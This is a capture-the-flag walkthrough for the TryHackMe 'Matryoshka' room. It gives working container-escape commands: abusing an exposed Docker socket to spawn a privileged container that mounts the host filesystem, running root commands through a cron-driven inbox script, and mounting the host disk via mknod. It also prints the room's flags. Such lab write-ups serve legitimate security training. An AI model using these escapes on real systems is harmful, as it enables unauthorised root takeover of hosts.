---
title: "Matryoshka - TryHackMe Writeup & Walkthrough"
description: "A comprehensive guide on exploiting the Matryoshka room on TryHackMe, involving Docker socket manipulation and privilege escalation."
permalink: /TryHackMe/MEDIUM/Matryoshka/
---

# TryHackMe: Matryoshka Room Writeup

[![TryHackMe](https://img.shields.io/badge/TryHackMe-Medium-orange)](https://tryhackme.com/room/matryoshka)
[![Docker Exploitation](https://img.shields.io/badge/Category-Docker%20Exploitation-brightgreen)](#)

> Room Link → [Matryoshka](https://tryhackme.com/room/matryoshka)

## Matryoshka Containment Unit

You set up a containment unit designed to trap and contain even the most nefarious viruses, but you accidentally got trapped in it while testing it.

Your memory is fuzzy, and you don't remember much about how you set it up.

Good luck!

---

### TL;DR

**Attack chain:**

1. SSH → found `.dockerenv` + `docker.sock` → spawned privileged Alpine container.
2. Mounted host’s `/` at `/host` → read first flag (`flag_level2.txt`).
3. Discovered `/mnt/level3share/inbox` → used cron‑driven script execution to read `/root/flag_level3.txt`.
4. Escaped to host via device node (`mknod` + `mount`) → final flag `THM{SP@C3D_0UT}`.

---

After logged in using `ssh` we can see that there's not anything of use not even `sudo`, thus when we check the `/` directory we found a `.dockerenv` file which concludes that the given environment is a **_docker container_**.

And we also have `docker.sock` file which means we can run `docker` commands

```shell
# inside first container
f2b009443cec:/$ ls -la /var/run/docker.sock
srw-rw-rw- 1 root 2375 0 May 15 15:06 /var/run/docker.sock
```

So let's check `docker images`

```shell
f2b009443cec:/$ docker images
REPOSITORY          TAG       IMAGE ID       CREATED       SIZE
matryoshka-level1   local     485e908211ec   11 days ago   43.9MB
alpine              3.20      bf8527eb54c3   4 weeks ago   7.8MB
```

So, now we try to spawn the alpine image using given command:

```shell
docker run -it --rm --privileged --pid=host --net=host -v /:/host alpine:3.20 /bin/sh
```

```shell
f2b009443cec:/$ docker run -it --rm --privileged --pid=host --net=host -v /:/host alpine:3.20 /bin/sh
/ # whoami
root
```

**What each flag does (important for understanding):**

- `--privileged` → Gives the container almost full host access
- `--pid=host` → Shares host's process namespace (see host processes)
- `--net=host` → Uses host's network stack
- `-v /:/host` → Mounts the **host's entire root filesystem** at `/host` inside the Alpine container

Once we're inside the alpine system we can list the `/host` directories

```shell
# inside alpine
/ # ls -la /host
total 72
drwxr-xr-x    1 root     root          4096 Jun 15 03:40 .
drwxr-xr-x   20 root     root          4096 Jun 15 03:46 ..
-rwxr-xr-x    1 root     root             0 Jun 15 03:40 .dockerenv
drwxr-xr-x    1 root     root          4096 May  4 14:26 bin
drwxrwxrwt    1 root     root          4096 Jun 15 03:40 certs
drwxr-xr-x    5 root     root           340 Jun 15 03:40 dev
drwxr-xr-x    1 root     root          4096 Jun 15 03:40 etc
drwxr-xr-x    1 root     root          4096 Jul 25  2024 home
drwxr-xr-x    1 root     root          4096 May  4 14:26 lib
drwxr-xr-x    5 root     root          4096 Jul 22  2024 media
drwxr-xr-x    1 root     root          4096 Jun 15 03:40 mnt
drwxr-xr-x    1 root     root          4096 Jun 15 03:40 opt
dr-xr-xr-x  197 root     root             0 Jun 15 03:40 proc
drwx------    1 root     root          4096 Jun 15 03:40 root
drwxr-xr-x    1 root     root          4096 Jun 15 03:40 run
drwxr-xr-x    1 root     root          4096 May  4 14:26 sbin
drwxr-xr-x    2 root     root          4096 Jul 22  2024 srv
dr-xr-xr-x   13 root     root             0 Jun 15 03:43 sys
drwxrwxrwt    2 root     root            40 Jun 15 03:46 tmp
drwxr-xr-x    1 root     root          4096 Jul 25  2024 usr
drwxr-xr-x    1 root     root          4096 Jul 22  2024 var
```

And we can see the `/host/root` directory also

```shell
/ # ls -lah /host/root
total 12K
drwx------    1 root     root        4.0K Jun 15 03:40 .
drwxr-xr-x    1 root     root        4.0K Jun 15 03:40 ..
-r--------    1 root     root          20 Jun 15 03:40 flag_level2.txt
/ #
```

Which consist `flag_level2.txt` which has the following flag

> [!FLAG] First Flag (flag_level2.txt)
> `THM{RUN@W@Y_S0CK3T}`

#### What is the Level 3 flag?

With the help of given hint

> [!TIP] HINT >
> **Look for an Inbox folder that allows script executions.**

I searched for "inbox" directory inside the alpine system and found it.

```shell
/ # find / -type d -name "inbox"
/host/mnt/level3share/inbox
```

Here I've to search for what this inbox/outbox system is when I found this

> Now here is the habit you need to build in CTFs. When you see something that looks like an input and output mechanism, your brain should immediately ask: what is reading from inbox and writing to outbox, and who is running it?
> From [this article](https://shakilahmedsrabon.me/blog-single.php?slug=matryoshka-thm-walkthrough&i=1#:~:text=%60%2E-,Now,it)

So, Let's test out this inbox outbox system

First, we'll create a bash file inside `inbox` dir. and after waiting for few seconds we'll likely get the output inside `outbox` dir.

```shell
/host/mnt/level3share # echo "id" > /host/mnt/level3share/inbox/test.sh
```

Output :

```shell
/host/mnt/level3share/outbox # cat test.sh.out
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

This happening must be the work of a `cron` job that is running on the `host`

> A cron job is just a scheduled task that runs automatically at set intervals. Like an alarm clock that executes a command instead of making noise

As the cronjob is running on the `host` we can list the `host` `root` directory using commands given to the `inbox` which will be thrown to the `outbox` dir.

```shell
/host/mnt/level3share # echo "ls -la /root" > inbox/test.sh
/host/mnt/level3share # ls outbox/
test.sh.out
```

```shell
/host/mnt/level3share # cat outbox/test.sh.out
total 12
drwx------ 1 root root 4096 Jun 15 04:45 .
drwxr-xr-x 1 root root 4096 Jun 15 04:45 ..
-r-------- 1 root root   15 Jun 15 04:45 flag_level3.txt
```

We can see `flag_level3.txt` file listed inside the `test.sh.out` file (which is our result from `inbox` script)

After using `cat` to print the flag using command

```shell
echo 'cat /root/flag_level3.txt' > inbox/get_flag.sh
```

We got the flag

> [!FLAG] Second flag (flag_level3.txt)
> `THM{RW_B1ND3D}`

#### What is the Host flag?

To get the `host` flag we need to do a full escape to the `/host` system to get the actual terminal from the `host` through which we can get our final `host` flag.

According to this writeup [Shakil Ahmed](https://shakilahmedsrabon.me/blog-single.php?slug=matryoshka-thm-walkthrough&i=1)
We can escape by creating a device node.

##### Step 1: Get the drive's address

```shell
/host/mnt/level3share # ls /sys/class/block/
loop0      loop1      loop2      loop3      loop4      loop5      loop6      loop7      loop8      loop9      nvme0n1    nvme0n1p1  nvme1n1
```

> [!NOTE] Device Node
> A device node is a special file that represents a physical hardware device and allows programs to interact with it directly. If you can create a device node that points to the host's actual hard drive, you can mount that drive and read everything on it.

```shell
/host/mnt/level3share # cat /sys/class/block/nvme0n1p1/dev  # or sda1 depending on the system
259:1
```

This gives you the `Major:Minor` numbers. In this case, `259:1`. Write these down. You need them in a moment.

##### Step 2: Spawn a privileged container

Our current container does not have the kernel capabilities needed for next step and even if you run the next command you will most likely get the following error

```shell
/bin/sh: docker: not found
```

Thus **_exit_** from the current shell and run the following command:

```shell
# Spawn a privileged container via the Docker socket
docker -H unix:///run/docker.sock run --privileged -it alpine:3.20 /bin/sh
```

> The `--privileged` flag is not just "a bit more access". It gives the container nearly all kernel capabilities. It can interact with hardware, create device nodes, mount drives. A privileged container barely deserves to be called contained at this point.

Now, Inside that container do the following

```shell
# Inside that container:
mknod /tmp/host_disk b 259 1  # use the numbers you found
mkdir /tmp/mnt
mount /tmp/host_disk /tmp/mnt
cat /tmp/mnt/root/flag_host.txt
```

**Breaking this down:**

- `mknod` creates the device node. `b` tells it this is a block device, which is the category hard drives fall under. `259 1` are the Major and Minor numbers you found earlier. You have just created a file that the kernel will treat as a direct reference to the host's physical drive.
- `mkdir` creates a temp. directory inside `/tmp`
- `mount` mounts the `/tmp/host_disk` to `/tmp/mnt`
- `cat` prints the `host` flag.

```shell
/ # mknod /tmp/host_disk b 259 1
/ # mkdir /tmp/mnt
/ # mount /tmp/host_disk /tmp/mnt/
/ # cat /tmp/mnt/root/flag_host.txt
THM{SP@C3D_0UT}
```

> [!FLAG] Host/Final Flag
> `THM{SP@C3D_0UT}`

---

## Lessons learned

- **Docker socket exposure** → full control over host’s Docker daemon.
- **`--privileged --pid=host`** → allows `nsenter`‑based escapes.
- **Inbox/outbox + cron** → a sneaky way to execute commands as root on the host.
- **Device nodes** → direct hardware access lets you mount the host’s real disk.

---

Happy Hacking!
